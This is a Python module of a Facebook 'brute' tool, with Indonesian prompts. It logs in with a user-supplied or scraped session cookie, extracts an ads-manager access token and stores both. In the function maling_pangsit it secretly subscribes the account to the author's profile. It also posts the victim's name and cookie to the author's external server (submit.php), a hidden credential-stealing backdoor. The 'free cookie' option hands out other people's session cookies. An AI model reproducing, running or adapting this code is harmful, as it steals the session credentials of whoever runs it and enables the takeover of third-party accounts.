#######################################################
# Name           : Brute Facebook (BF)                #
# File           : cokz.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, random, time

from bs4 import BeautifulSoup as par
from yxz.loading_rich import Load
from yxz.logo import Logo
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
#-------------------------------------------------------------------
class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.coz = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.war=random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
        self.menu()

    def menu(self):
        Logo()
        prints(Panel(f"""[{self.war}01[/]]. Login menggunakan cookie
[{self.war}02[/]]. Cookie gratis ([red]gak semuanya valid[/])
[{self.war}03[/]]. Cara mendapatkan cookie""", padding=(0,5), style="bold white", width=70))
        p = input("╰──> ")
        if p in ["", " "]:
            prints(Panel("[[bold red]![/]] Jangan kosong ", style="bold white", width=70));time.sleep(3);self.menu()
        elif p in["1","01"]:
            self.login_cookie()
        elif p in["2","02"]:
            self.cok()
        elif p in["3","03"]:
            exit(" sabar lagi bikin vidionya")
        else:
            prints(Panel("[[bold red]![/]] input yang benar.", style="bold white", width=70));time.sleep(3);self.menu()

    def cok(self):
        url = par(self.ses.get("https://www.facebook.com/100072216287842/posts/pfbid0TYrLvDsAWfYzG3bMXicPFE1XSfmALHTBX1spb1Vf4p3mVjsG9Y4yZU7xCMWMH1HCl/").text, "html.parser")
        data = re.findall('"text":"(.*?)"',str(url))
        cokxyz = []
        nomor = 0
        for mmk in data:
            if len(mmk)>=20:
                try:
                    if mmk in cokxyz:pass
                    else:
                        nomor +=1
                        cokxyz.append(mmk)
                        prints(Panel(f"[bold green]{mmk}[/]", style="bold white", width=70, title=f"[[bold blue]{nomor}[/]]"))
                except:continue
        ahh = input("╰──> ")
        try:
            cookie = cokxyz[int(ahh)-1]
            self.login_cokie(cookie)
        except Exception:
            prints(Panel(f"[[red]![/]] gagal mengambil cookie", style="bold white", width=70));time.sleep(3);self.menu()

    def login_cookie(self):
        prints(Panel(f"Sebelum memasukan cookie, silhakan akses url ini: [bold green]{self.url}/adsmanager/manage/campaigns[/] di kiwi browser. lalu ambil cookie nya di sana", padding=(0,5),style="bold white", width=70, title="CATATAN"))
        coki = input(f"[{O}?{N}] cookie fb :{H} ")
        self.login_cokie(coki)

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            self.ses.post(self.coz, data=data)
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def login_cokie(self, cok):
        Load().cek_coki()
        try:
            link = par(self.ses.get(f"{self.url}/adsmanager/manage/campaigns", cookies={"cookie":cok}).text, "html.parser")
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                prints(Panel("🙄 [bold cyan]akun ini sedang menggunakan mode free facebook, Tunggu sebentar sedang mengubah ke mode data.", style="bold white", width=70))
                Load().ubah_taa()
                self.ubah_data(urll, cok)
            else:
                cook = re.search("act=(.*?)&nav_source", str(link)).group(1)
                took = self.ses.get(f"{self.url}/adsmanager/manage/campaigns?act={cook}&nav_source=no_referrer", cookies={"cookie":cok}).text
                tokz = re.search('accessToken="(.*?)"', took).group(1)
                self.maling_pangsit(cok, tokz)
                open("assets/.cokie.txt", "w").write(cok);open("assets/.token.txt", "w").write(tokz)
                exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python run.py")
        except requests.exceptions.ConnectionError:
            prints(Panel("😭[bold red] Tidak ada koneksi internet", style="bold white", width=70));time.sleep(3);self.menu()
        except (KeyError,AttributeError):
            prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()

    def maling_pangsit(self, cok, tok):
        try:nama = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tok}", cookies={"cookie": cok}).json()["name"]
        except:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies={"cookie": cok}).text, "html.parser")
            if "/a/subscriptions/remove" in str(link):
                prints(Panel(f"      Selamat datang [bold green]{nama}[/] Di Script Brute Facebook", style="bold white", width=70))
            elif "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok})
                self.datas(nama, cok)
                prints(Panel(f"      Selamat datang [bold green]{nama}[/] Di Script Brute Facebook", style="bold white", width=70))
            else:pass
        except:pass

    def ubah_data(self, link, coki):
        try:
            sess = requests.Session()
            gett = sess.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            sess.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
            prints(Panel("🥳 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python run.py[/]", style="bold white", width=70));exit()
        except:exit()